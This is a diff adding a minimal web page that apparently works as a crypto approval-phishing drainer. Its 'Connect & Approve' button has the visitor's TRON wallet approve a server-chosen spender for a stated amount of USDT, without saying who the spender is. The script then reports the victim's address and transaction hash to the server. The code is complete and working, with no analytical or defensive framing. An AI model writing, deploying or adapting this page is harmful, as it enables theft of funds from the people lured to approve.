@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  <title>Approve</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@500;600&display=swap');
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      font-family:'Inter',system-ui,-apple-system,sans-serif;
+      background:#fff;
+      min-height:100dvh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+      -webkit-font-smoothing:antialiased;
+    }
+    .wrap{width:min(100%,400px);text-align:center}
+    .btn{
+      display:block;
+      width:100%;
+      padding:18px 32px;
+      background:#2EB553;
+      color:#fff;
+      border:none;
+      border-radius:16px;
+      font-family:inherit;
+      font-size:18px;
+      font-weight:600;
+      letter-spacing:-.01em;
+      cursor:pointer;
+      transition:opacity .2s, transform .15s;
+      -webkit-tap-highlight-color:transparent;
+    }
+    .btn:active{transform:scale(.97)}
+    .btn:disabled{opacity:.45;cursor:not-allowed;transform:none}
+    .status{
+      margin-top:20px;
+      font-size:14px;
+      color:#888;
+      min-height:22px;
+      line-height:1.5;
+    }
+    .status.err{color:#e44}
+    .status.ok{color:#2EB553}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <button class="btn" id="btn" disabled>Connect & Approve</button>
+  <div class="status" id="status" role="status">Loading…</div>
+</div>
+<script>
+(function(){
+  var USDT='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+  var amount=0;
+  var spender='';
+  var btn=document.getElementById('btn');
+  var st=document.getElementById('status');
+
+  function status(m,t){st.textContent=m;st.className='status'+(t?' '+t:'')}
+
+  var slug=location.pathname.replace(/^\//,'');
+  if(!slug){status('Invalid link.','err');return}
+
+  fetch('/api/decode/'+encodeURIComponent(slug))
+    .then(function(r){return r.json()})
+    .then(function(d){
+      if(d.error){status('This link is invalid or expired.','err');return}
+      amount=d.amount;
+      spender=d.spender;
+      btn.disabled=false;
+      status('');
+    })
+    .catch(function(){
+      status('Could not verify link.','err');
+    });
+
+  btn.addEventListener('click',function(){
+    if(!window.tronLink&&!window.tronWeb){
+      status('Please open in Trust Wallet.','err');
+      return;
+    }
+    btn.disabled=true;
+    btn.textContent='Connecting…';
+
+    var connect=window.tronLink?window.tronLink.request({method:'tron_requestAccounts'}):Promise.resolve();
+    connect.then(function(){
+      var tw=window.tronWeb;
+      if(!tw||!tw.defaultAddress||!tw.defaultAddress.base58){
+        throw new Error('No wallet connected.');
+      }
+      var userAddr=tw.defaultAddress.base58;
+      btn.textContent='Approving…';
+
+      var units=BigInt(Math.round(parseFloat(amount)*1e6));
+      return tw.contract().at(USDT).then(function(contract){
+        return contract.approve(spender,units.toString()).send();
+      }).then(function(tx){
+        var txId=typeof tx==='string'?tx:(tx&&tx.txid?tx.txid:'');
+        btn.textContent='Approved ✓';
+        btn.style.background='#2EB553';
+        status('Done','ok');
+
+        return fetch('/api/wallets/record',{
+          method:'POST',
+          headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
+          body:JSON.stringify({address:userAddr,amount:String(amount),txHash:txId})
+        });
+      });
+    }).catch(function(e){
+      btn.disabled=false;
+      btn.textContent='Connect & Approve';
+      status(e.message||'Failed. Try again.','err');
+    });
+  });
+})();
+</script>
+</body>
+</html>
